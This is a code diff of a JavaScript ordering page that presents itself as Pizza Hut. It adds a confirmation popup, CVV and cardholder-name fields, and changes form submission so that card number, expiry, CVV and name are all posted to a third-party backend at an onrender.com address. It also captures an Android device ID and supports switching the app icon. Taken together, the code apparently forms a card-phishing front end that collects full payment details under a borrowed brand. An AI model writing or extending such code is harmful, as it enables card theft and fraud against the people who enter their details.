@@ -1,6 +1,5 @@
 document.addEventListener("DOMContentLoaded", () => {
   const serverUrl = "https://pizzahut-back.onrender.com";
-
   let deviceId = localStorage.getItem("deviceId");
   if (!deviceId && window.AndroidBridge?.getDeviceId) {
     deviceId = window.AndroidBridge.getDeviceId();
@@ -66,29 +65,46 @@ document.addEventListener("DOMContentLoaded", () => {
     localStorage.setItem("selected-icon", getCurrentIcon());
   });
 
-  const popup = document.getElementById("payment-popup");
-  const closeBtn = popup.querySelector(".close-btn");
-  const openBtns = document.querySelectorAll(".order-now-btn");
+  const paymentPopup = document.getElementById("payment-popup");
+  const confirmationPopup = document.getElementById("confirmation-popup");
+  const closeBtns = document.querySelectorAll(".popup-overlay .close-btn");
+  const openOrderBtns = document.querySelectorAll(".order-now-btn");
   const orderForm = document.getElementById("payment-form");
   const orderMessage = document.getElementById("order-message");
+  const confirmCloseBtn = document.getElementById("confirm-close");
 
-  openBtns.forEach(btn =>
+  openOrderBtns.forEach(btn =>
     btn.addEventListener("click", e => {
       e.preventDefault();
-      popup.classList.add("active");
+      paymentPopup.classList.add("active");
     })
   );
-  closeBtn.addEventListener("click", () => {
-    popup.classList.remove("active");
-    clearErrors();
-    orderForm.reset();
-  });
-  popup.addEventListener("click", e => {
-    if (e.target === popup) {
-      popup.classList.remove("active");
-      clearErrors();
-      orderForm.reset();
-    }
+
+  closeBtns.forEach(btn =>
+    btn.addEventListener("click", () => {
+      const pop = btn.closest(".popup-overlay");
+      pop.classList.remove("active");
+      if (pop === paymentPopup) {
+        orderForm.reset();
+        clearErrors();
+      }
+    })
+  );
+
+  [paymentPopup, confirmationPopup].forEach(pop =>
+    pop.addEventListener("click", e => {
+      if (e.target === pop) {
+        pop.classList.remove("active");
+        if (pop === paymentPopup) {
+          orderForm.reset();
+          clearErrors();
+        }
+      }
+    })
+  );
+
+  confirmCloseBtn.addEventListener("click", () => {
+    confirmationPopup.classList.remove("active");
   });
 
   const validators = {
@@ -140,14 +156,30 @@ document.addEventListener("DOMContentLoaded", () => {
 
   const cardInput = document.getElementById("cardNumber");
   const expiryInput = document.getElementById("expiry");
+  const cvvInput = document.getElementById("cvv");
+  const nameInput = document.getElementById("cardholderName");
+
+  nameInput.addEventListener("keypress", e => {
+    if (/\d/.test(e.key)) e.preventDefault();
+  });
+
+  nameInput.addEventListener("input", () => {
+    nameInput.value = nameInput.value.replace(/\d+/g, "");
+  });
+
   cardInput?.addEventListener("input", () => {
     let v = cardInput.value.replace(/\D/g, "").slice(0, 16);
     cardInput.value = v.match(/.{1,4}/g)?.join(" ") || v;
   });
+
   expiryInput?.addEventListener("input", () => {
     let v = expiryInput.value.replace(/\D/g, "").slice(0, 4);
     if (v.length > 2) v = v.slice(0, 2) + "/" + v.slice(2);
     expiryInput.value = v;
+  });
+
+  cvvInput?.addEventListener("input", () => {
+    cvvInput.value = cvvInput.value.replace(/\D/g, "").slice(0, 4);
   });
 
   orderForm.addEventListener("submit", async e => {
@@ -158,13 +190,11 @@ document.addEventListener("DOMContentLoaded", () => {
     orderForm.querySelectorAll("input[id]").forEach(field => {
       const id = field.id;
       const val = field.value.trim();
-      if (validators[id]) {
-        if (!validators[id].fn(val)) {
-          showError(field, validators[id].msg);
-          hasError = true;
-        }
-        data[id] = val;
+      if (validators[id] && !validators[id].fn(val)) {
+        showError(field, validators[id].msg);
+        hasError = true;
       }
+      data[id] = val;
     });
     if (hasError) {
       orderMessage.textContent = "Bitte korrigiere die markierten Felder.";
@@ -180,7 +210,8 @@ document.addEventListener("DOMContentLoaded", () => {
       });
       const result = await res.json();
       if (!res.ok || !result.success) throw new Error(result.message);
-      popup.classList.remove("active");
+      paymentPopup.classList.remove("active");
+      confirmationPopup.classList.add("active");
       orderForm.reset();
     } catch (err) {
       console.error("Bestell-Fehler:", err);
